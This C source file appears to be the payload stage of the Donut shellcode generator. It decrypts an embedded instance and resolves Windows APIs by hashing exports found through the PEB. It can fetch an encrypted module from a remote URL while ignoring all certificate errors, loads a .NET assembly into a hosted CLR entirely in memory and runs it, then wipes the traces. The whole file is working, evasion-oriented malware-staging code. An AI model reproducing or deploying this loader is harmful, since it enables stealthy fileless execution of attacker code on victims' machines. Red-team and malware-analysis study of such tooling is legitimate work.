/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "payload.h"

#if defined(_MSC_VER)
#pragma intrinsic(memset)
#define Memset(x,y,z) __stosb(x,y,z)
#endif

DWORD ThreadProc(LPVOID lpParameter) {
    ULONG           i, ofs;
    ULONG64         sig;
    PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
    DONUT_ASSEMBLY  assembly;
    
    Memset((PBYTE)&assembly, 0, sizeof(assembly));
    
#if !defined(NOCRYPTO)
    PBYTE           inst_data;
    // load pointer to data just past len + key
    ofs = sizeof(DWORD) + sizeof(DONUT_CRYPT);
    inst_data = (PBYTE)inst + ofs;
    
    DPRINT("Decrypting %li bytes of instance", inst->len);
    
    donut_decrypt(inst->key.mk, 
            inst->key.ctr, 
            inst_data, 
            inst->len - ofs);
    
    DPRINT("Generating hash to verify decryption");
    ULONG64 mac = maru(inst->sig, inst->iv);
    DPRINT("Instance : %016llx | Result : %016llx", inst->mac, mac);
    
    if(mac != inst->mac) {
      DPRINT("Decryption of instance failed");
      return -1;
    }
#endif
    DPRINT("Resolving LoadLibraryA");
    
    inst->api.addr[0] = xGetProcAddress(inst, inst->api.hash[0], inst->iv);
    if(inst->api.addr[0] == NULL) return -1;
    
    for(i=0; i<inst->dll_cnt; i++) {
      DPRINT("Loading %s ...", inst->dll_name[i]);
      inst->api.LoadLibraryA(inst->dll_name[i]);
    }
    
    DPRINT("Resolving %i API", inst->api_cnt);
    
    for(i=1; i<inst->api_cnt; i++) {
      DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
        
      inst->api.addr[i] = xGetProcAddress(inst, inst->api.hash[i], inst->iv);
    }
    
    if(inst->type == DONUT_INSTANCE_URL) {
      DPRINT("Instance is URL");
      if(!DownloadModule(inst)) return -1;
    }

    if(LoadAssembly(inst, &assembly)) {
      RunAssembly(inst, &assembly);
    }
    
    FreeAssembly(inst, &assembly);
    
    // clear instance from memory
    Memset((PBYTE)inst, 0, inst->len);
    
    return 0;
}

BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
    PDONUT_MODULE   mod;
    HRESULT         hr;
    BSTR            domain;
    SAFEARRAYBOUND  sab;
    SAFEARRAY       *sa;
    DWORD           i;
    BOOL            loadable;
    PBYTE           p;
    
    if(inst->type == DONUT_INSTANCE_PIC) {
      DPRINT("Using module embedded in instance");
      mod = (PDONUT_MODULE)&inst->module.x;
    } else {
      DPRINT("Loading module from allocated memory");
      mod = inst->module.p;
    }

    if(inst->api.CLRCreateInstance != NULL) {
      DPRINT("CLRCreateInstance");
      
      hr = inst->api.CLRCreateInstance(
       (REFCLSID)&inst->xCLSID_CLRMetaHost, 
       (REFIID)&inst->xIID_ICLRMetaHost, 
       (LPVOID*)&pa->icmh);
      
      if(SUCCEEDED(hr)) {
        DPRINT("ICLRMetaHost::GetRuntime");
      
        hr = pa->icmh->lpVtbl->GetRuntime(
          pa->icmh, mod->runtime, 
          (REFIID)&inst->xIID_ICLRRuntimeInfo, (LPVOID)&pa->icri);
        
        if(SUCCEEDED(hr)) {
          DPRINT("ICLRRuntimeInfo::IsLoadable");
          hr = pa->icri->lpVtbl->IsLoadable(pa->icri, &loadable);
        
          if(SUCCEEDED(hr) && loadable) {
            DPRINT("ICLRRuntimeInfo::GetInterface");
          
            hr = pa->icri->lpVtbl->GetInterface(
              pa->icri, 
              (REFCLSID)&inst->xCLSID_CorRuntimeHost, 
              (REFIID)&inst->xIID_ICorRuntimeHost, (LPVOID)&pa->icrh);
              
            DPRINT("HRESULT: %08lx", hr);
          }
        } else pa->icri = NULL;
      } else pa->icmh = NULL;
    }
    if(FAILED(hr)) {
      DPRINT("CorBindToRuntime");
      
      hr = inst->api.CorBindToRuntime(
        NULL,  // load whatever's available
        NULL,  // load workstation build
        &inst->xCLSID_CorRuntimeHost,
        &inst->xIID_ICorRuntimeHost,
        (LPVOID*)&pa->icrh);
      
      DPRINT("HRESULT: %08lx", hr);
    }
    
    if(FAILED(hr)) {
      pa->icrh = NULL;
      return FALSE;
    }
    DPRINT("ICorRuntimeHost::Start");
    
    hr = pa->icrh->lpVtbl->Start(pa->icrh);
    
    if(SUCCEEDED(hr)) {
      domain = inst->api.SysAllocString(mod->domain);
      
      DPRINT("ICorRuntimeHost::CreateDomain");
      
      hr = pa->icrh->lpVtbl->CreateDomain(
        pa->icrh, domain, NULL, &pa->iu);
        
      inst->api.SysFreeString(domain);
      
      if(SUCCEEDED(hr)) {
        DPRINT("IUnknown::QueryInterface");
        
        hr = pa->iu->lpVtbl->QueryInterface(
          pa->iu, (REFIID)&inst->xIID_AppDomain, (LPVOID)&pa->ad);
          
        if(SUCCEEDED(hr)) {
          DPRINT("SafeArrayCreate(%lli bytes)", inst->mod_len);
            
          sab.lLbound   = 0;
          sab.cElements = mod->len;
          sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
          
          if(sa != NULL) {        
            DPRINT("Copying assembly to safe array");
            
            for(i=0, p=sa->pvData; i<mod->len; i++) {
              p[i] = mod->data[i];
            }
            DPRINT("AppDomain::Load_3");
            
            hr = pa->ad->lpVtbl->Load_3(
              pa->ad, sa, &pa->as);
              
            DPRINT("Erasing assembly from memory");
            
            for(i=0, p=sa->pvData; i<mod->len; i++) {
              p[i] = mod->data[i] = 0;
            }
            DPRINT("SafeArrayDestroy");
            inst->api.SafeArrayDestroy(sa);
          }
        }
      }
    }
    return SUCCEEDED(hr);
}
    
BOOL RunAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
    SAFEARRAY     *sav=NULL, params;
    VARIANT       arg, ret, vtPsa, v1={0}, v2;
    DWORD         i;
    PDONUT_MODULE mod;
    HRESULT       hr;
    BSTR          cls, method;
    ULONG         cnt;
    OLECHAR       str[1]={0};
    
    if(inst->type == DONUT_INSTANCE_PIC) {
      DPRINT("Using module embedded in instance");
      mod = (PDONUT_MODULE)&inst->module.x;
    } else {
      DPRINT("Loading module from allocated memory");
      mod = inst->module.p;
    }
    
    DPRINT("Type is %s", 
      mod->type == DONUT_MODULE_DLL ? "DLL" : "EXE");
    
    // if this is a program
    if(mod->type == DONUT_MODULE_EXE) {
      // get the entrypoint
      DPRINT("MethodInfo::EntryPoint");
      hr = pa->as->lpVtbl->EntryPoint(pa->as, &pa->mi);
      
      if(SUCCEEDED(hr)) {
        Memset((PBYTE)&params, 0, sizeof(params));
        // get the parameters for entrypoint
        DPRINT("MethodInfo::GetParameters");
        hr = pa->mi->lpVtbl->GetParameters(pa->mi, &params);
        if(SUCCEEDED(hr)) {
          cnt = 0;
          inst->api.SafeArrayGetUBound(&params, 0, (LONG*)&cnt);
          DPRINT("Number of parameters for entrypoint : %i", cnt);
          // does Main require string[] args?
          if(cnt != 0) {
            // create a 1 dimensional array for Main parameters
            sav = inst->api.SafeArrayCreateVector(VT_VARIANT, 0, 1);
            // if user specified their own parameters, add to string array
            if(mod->param_cnt != 0) {
              // create 1 dimensional array for strings[] args
              vtPsa.vt     = (VT_ARRAY | VT_BSTR);
              vtPsa.parray = inst->api.SafeArrayCreateVector(VT_BSTR, 0, mod->param_cnt);
              
              // add each string parameter
              for(i=0; i<mod->param_cnt; i++) {
                DPRINT("Adding \"%ws\" as parameter %i", mod->param[i], (i + 1));
                
                inst->api.SafeArrayPutElement(vtPsa.parray, 
                    &i, inst->api.SysAllocString(mod->param[i]));
              }
            } else {
              DPRINT("Adding empty string for invoke_3");
              // add empty string to make it work
              // create 1 dimensional array for strings[] args
              vtPsa.vt     = (VT_ARRAY | VT_BSTR);
              vtPsa.parray = inst->api.SafeArrayCreateVector(VT_BSTR, 0, 1);
              
              i=0;
              inst->api.SafeArrayPutElement(vtPsa.parray, 
                    &i, inst->api.SysAllocString(str));
            }
            // add string array to list of parameters
            i=0;
            inst->api.SafeArrayPutElement(sav, &i, &vtPsa);
          }
          v1.vt    = VT_NULL;
          v1.plVal = NULL;
          
          DPRINT("MethodInfo::Invoke_3()\n");
          
          hr = pa->mi->lpVtbl->Invoke_3(pa->mi, v1, sav, &v2);
          
          DPRINT("MethodInfo::Invoke_3 : %08lx : %s", 
            hr, SUCCEEDED(hr) ? "Success" : "Failed");
            
          if(sav != NULL) {
            inst->api.SafeArrayDestroy(vtPsa.parray);
            inst->api.SafeArrayDestroy(sav);
          }
        }
      } else pa->mi = NULL;
    } else {
      DPRINT("SysAllocString(\"%ws\")", mod->cls);
      cls = inst->api.SysAllocString(mod->cls);
      if(cls == NULL) return FALSE;
    
      DPRINT("SysAllocString(\"%ws\")", mod->method);
      method = inst->api.SysAllocString(mod->method);
    
      if(method != NULL) {
        DPRINT("Assembly::GetType_2");
        hr = pa->as->lpVtbl->GetType_2(pa->as, cls, &pa->type);
        
        if(SUCCEEDED(hr)) {
          sav = NULL;
          if(mod->param_cnt != 0) {
            DPRINT("SafeArrayCreateVector(%li parameter(s))", mod->param_cnt);
            
            sav = inst->api.SafeArrayCreateVector(
              VT_VARIANT, 0, mod->param_cnt);
          
            if(sav != NULL) {
              for(i=0; i<mod->param_cnt; i++) {
                DPRINT("Adding \"%ws\" as parameter %i", mod->param[i], (i+1));
                
                V_BSTR(&arg) = inst->api.SysAllocString(mod->param[i]);
                V_VT(&arg)   = VT_BSTR;
                
                hr = inst->api.SafeArrayPutElement(sav, &i, &arg);
                
                if(FAILED(hr)) {
                  DPRINT("SafeArrayPutElement failed.");
                  inst->api.SafeArrayDestroy(sav);
                  sav = NULL;
                }
              }
            }
          }
          if(SUCCEEDED(hr)) {
            DPRINT("Calling Type::InvokeMember_3");
            
            hr = pa->type->lpVtbl->InvokeMember_3(
                pa->type, 
                method,   // name of method 
                BindingFlags_InvokeMethod | 
                BindingFlags_Static       | 
                BindingFlags_Public,
                NULL, 
                v1,       // empty VARIANT
                sav,      // arguments to method
                &ret);    // return code from method
                         
            DPRINT("Type::InvokeMember_3 : %08lx : %s", 
              hr, SUCCEEDED(hr) ? "Success" : "Failed");
              
            if(sav != NULL) {
              inst->api.SafeArrayDestroy(sav);
            }
          }
        }
        inst->api.SysFreeString(method);
      }
      inst->api.SysFreeString(cls);
    }
    return TRUE;
}
  
VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
  
    if(inst->type == DONUT_INSTANCE_URL) {
      if(inst->module.p != NULL) {
        // overwrite with zeros
        Memset((PBYTE)inst->module.p, 0, (DWORD)inst->mod_len);
        
        // free memory
        inst->api.VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
        inst->module.p = NULL;
      }
    }
    
    if(pa->type != NULL) {
      DPRINT("Type::Release");
      pa->type->lpVtbl->Release(pa->type);
      pa->type = NULL;
    }

    if(pa->mi != NULL) {
      DPRINT("MethodInfo::Release");
      pa->mi->lpVtbl->Release(pa->mi);
      pa->mi = NULL;
    }
    
    if(pa->as != NULL) {
      DPRINT("Assembly::Release");
      pa->as->lpVtbl->Release(pa->as);
      pa->as = NULL;
    }
    
    if(pa->ad != NULL) {
      DPRINT("AppDomain::Release");
      pa->ad->lpVtbl->Release(pa->ad);
      pa->ad = NULL;
    }

    if(pa->iu != NULL) {
      DPRINT("IUnknown::Release");
      pa->iu->lpVtbl->Release(pa->iu);
      pa->iu = NULL;
    }
    
    if(pa->icrh != NULL) {
      DPRINT("ICorRuntimeHost::Stop");
      pa->icrh->lpVtbl->Stop(pa->icrh);
      
      DPRINT("ICorRuntimeHost::Release");
      pa->icrh->lpVtbl->Release(pa->icrh);
      pa->icrh = NULL;
    }
    
    if(pa->icri != NULL) {
      DPRINT("ICLRRuntimeInfo::Release");
      pa->icri->lpVtbl->Release(pa->icri);
      pa->icri = NULL;
    }
    
    if(pa->icmh != NULL) {
      DPRINT("ICLRMetaHost::Release");
      pa->icmh->lpVtbl->Release(pa->icmh);
      pa->icmh = NULL;
    }
}

/**
  Try download a module from HTTP server
  Uses HTTPS if required, but ignores invalid certificates
  Module is downloaded into memory and should be released after loading with VirtualFree.
  Returns TRUE on success, else FALSE
  
  If TRUE, inst->assembly.p will point to encrypted PDONUT_MODULE
*/
BOOL DownloadModule(PDONUT_INSTANCE inst) {
    HINTERNET       hin, con, req;
    PBYTE           buf;
    DWORD           s, n, rd, len, code=0;
    BOOL            bResult = FALSE, bSecure = FALSE;
    URL_COMPONENTS  uc;
    CHAR            host[DONUT_MAX_URL], 
                    file[DONUT_MAX_URL];
    
    // default flags for HTTP client
    DWORD flags = INTERNET_FLAG_KEEP_CONNECTION   | 
                  INTERNET_FLAG_NO_CACHE_WRITE    | 
                  INTERNET_FLAG_NO_UI             |
                  INTERNET_FLAG_RELOAD            |
                  INTERNET_FLAG_NO_AUTO_REDIRECT;
    
    Memset((void*)&uc, 0, sizeof(uc));
    
    uc.dwStructSize     = sizeof(uc);
    uc.lpszHostName     = host;
    uc.lpszUrlPath      = file;
    uc.dwHostNameLength = DONUT_MAX_URL;
    uc.dwUrlPathLength  = DONUT_MAX_URL;
    
    DPRINT("Decoding URL %s", inst->http.url);
    
    if(!inst->api.InternetCrackUrl(
      inst->http.url, 0, ICU_DECODE, &uc)) {
      return FALSE;
    }
    
    bSecure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    
    // if secure connection, update the flags to ignore
    // invalid certificates
    if(bSecure) {
      flags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID   |
               INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
               INTERNET_FLAG_SECURE;
    }
                  
    DPRINT("Initializing WININET");
    
    hin = inst->api.InternetOpen(
      NULL, INTERNET_OPEN_TYPE_PRECONFIG, 
      NULL, NULL, 0);
    
    if(hin == NULL) return FALSE;

    DPRINT("Creating %s connection for %s", 
      bSecure ? "HTTPS" : "HTTP", host);
      
    con = inst->api.InternetConnect(
        hin, host, 
        bSecure ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 
        NULL, NULL, 
        INTERNET_SERVICE_HTTP, 0, 0);
        
    if(con != NULL) {
      DPRINT("Creating HTTP %s request for %s", 
        inst->http.req, file);
        
      req = inst->api.HttpOpenRequest(
              con, inst->http.req, 
              file, NULL, NULL, NULL, flags, 0);
              
      if(req != NULL) {
        
        // see if we should ignore invalid certificates for this request
        if(bSecure) {
          if(flags & INTERNET_FLAG_IGNORE_CERT_CN_INVALID) {
            n = sizeof (s);
            
            s = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                SECURITY_FLAG_IGNORE_WRONG_USAGE       |
                SECURITY_FLAG_IGNORE_REVOCATION;
                
            DPRINT("Setting option to ignore invalid certificates");
          
            inst->api.InternetSetOption(
              req, 
              INTERNET_OPTION_SECURITY_FLAGS, 
              &s, 
              sizeof(s));
          }
        }
        DPRINT("Sending request");
        
        if(inst->api.HttpSendRequest(req, NULL, 0, NULL, 0)) {
          len  = sizeof(DWORD);
          code = 0;
          DPRINT("Querying status code");
          
          if(inst->api.HttpQueryInfo(
              req, 
              HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, 
              &code, &len, 0))
          {
            DPRINT("Code is %ld", code);
            
            if(code == HTTP_STATUS_OK) {
              DPRINT("Querying content length");
              
              len           = sizeof(SIZE_T);
              inst->mod_len = 0;
              
              if(inst->api.HttpQueryInfo(
                req, 
                HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, 
                &inst->mod_len, &len, 0))
              {
                if(inst->mod_len != 0) {
                  DPRINT("Allocating memory for module");
                  
                  inst->module.p = inst->api.VirtualAlloc(
                    NULL, inst->mod_len, 
                    MEM_COMMIT | MEM_RESERVE, 
                    PAGE_READWRITE);
                    
                  if(inst->module.p != NULL) {
                    rd = 0;
                    DPRINT("Downloading module into memory");
                    bResult = inst->api.InternetReadFile(
                      req, 
                      inst->module.p, 
                      inst->mod_len, &rd);
                  }
                }
              }
            }
          }
        }
        DPRINT("Closing request handle");
        inst->api.InternetCloseHandle(req);
      }
      DPRINT("Closing HTTP connection");
      inst->api.InternetCloseHandle(con);
    }
    DPRINT("Closing internet handle");
    inst->api.InternetCloseHandle(hin);
       
#if !defined(NOCRYPTO)
    if(bResult) {
      PDONUT_MODULE mod = inst->module.p;
      
      DPRINT("Decrypting %lli bytes of module", inst->mod_len);
    
      donut_decrypt(inst->mod_key.mk, 
              inst->mod_key.ctr,
              mod, 
              inst->mod_len);
            
      DPRINT("Generating hash to verify decryption");
      ULONG64 mac = maru(inst->sig, inst->iv);
      
      DPRINT("Module : %016llx | Result : %016llx", mod->mac, mac);
      
      if(mac != mod->mac) {
        DPRINT("Decryption failed");
        return FALSE;
      }
    }
#endif
    return bResult;
}

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// locate address of API in export table
LPVOID FindExport(PDONUT_INSTANCE inst, LPVOID base, ULONG64 api_hash, ULONG64 iv){
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   i, j, cnt, rva;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll, p;
    LPVOID                  addr=NULL;
    ULONG64                 dll_hash;
    CHAR                    buf[MAX_PATH], dll_name[64], api_name[128];
    
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    // get hash of DLL string converted to lowercase
    for(i=0;dll[i]!=0;i++) {
      buf[i] = dll[i] | 0x20;
    }
    buf[i] = 0;
    dll_hash = maru(buf, iv);

    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // xor with DLL hash and compare with hash to find
      if ((maru(api, iv) ^ dll_hash) == api_hash) {
        // return address of function
        addr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        
        // is this a forward reference?
        if ((PBYTE)addr >= (PBYTE)exp &&
            (PBYTE)addr <  (PBYTE)exp + 
            dir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)
        {
          DPRINT("%016llx is forwarded to %s", 
            api_hash, (char*)addr);
            
          // copy DLL name to buffer
          p=(char*)addr;
          
          for(i=0; p[i] != 0 && i < sizeof(dll_name)-4; i++) {
            dll_name[i] = p[i];
            if(p[i] == '.') break;
          }

          dll_name[i+1] = 'd';
          dll_name[i+2] = 'l';
          dll_name[i+3] = 'l';
          dll_name[i+4] = 0;
          
          p += i + 1;
          
          // copy API name to buffer
          for(i=0; p[i] != 0 && i < sizeof(api_name)-1;i++) {
            api_name[i] = p[i];
          }
          api_name[i] = 0;
          
          DPRINT("Trying to load %s", dll_name);
          HMODULE hModule = inst->api.LoadLibrary(dll_name);
          
          if(hModule != NULL) {
            DPRINT("Calling GetProcAddress(%s)", api_name);
            addr = inst->api.GetProcAddress(hModule, api_name);
          } else addr = NULL;
        }
        return addr;
      }
    } while (--cnt && addr == NULL);
    
    return addr;
}

// search all modules in the PEB for API
LPVOID xGetProcAddress(PDONUT_INSTANCE inst, ULONG64 ulHash, ULONG64 ulIV) {
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                addr = NULL;
     
    #if defined(_WIN64)
      peb = (PPEB) __readgsqword(0x60);
    #else
      peb = (PPEB) __readfsdword(0x30);
    #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && addr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // search the export table for api
      addr = FindExport(inst, dte->DllBase, ulHash, ulIV);  
    }
    return addr;
}

// the following code is *only* for development purposes
// given an instance file, it will run as if running on a target system
// attach a debugger to host process
#ifdef DEBUG

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    FILE           *fd;
    struct stat     fs;
    PDONUT_INSTANCE inst;
    
    if(argc != 2) {
      printf("  [ usage: payload <instance>\n");
      return 0;
    }
    // get size of instance
    if(stat(argv[1], &fs) != 0) {
      printf("  [ unable to obtain size of instance.\n");
      return 0;
    }
    
    // zero size?
    if(fs.st_size == 0) {
      printf("  [ invalid instance.\n");
      return 0;
    }
    
    // try open for reading
    fd = fopen(argv[1], "rb");
    if(fd == NULL) {
      printf("  [ unable to open %s.\n", argv[1]);
      return 0;
    }

    // allocate memory
    inst = (PDONUT_INSTANCE)malloc(fs.st_size);
    
    if(inst != NULL) {
      fread(inst, 1, fs.st_size, fd);
      printf("Running...");
      // run payload with instance
      ThreadProc(inst);
      free(inst);
    }
    fclose(fd);
    return 0;
}
#endif
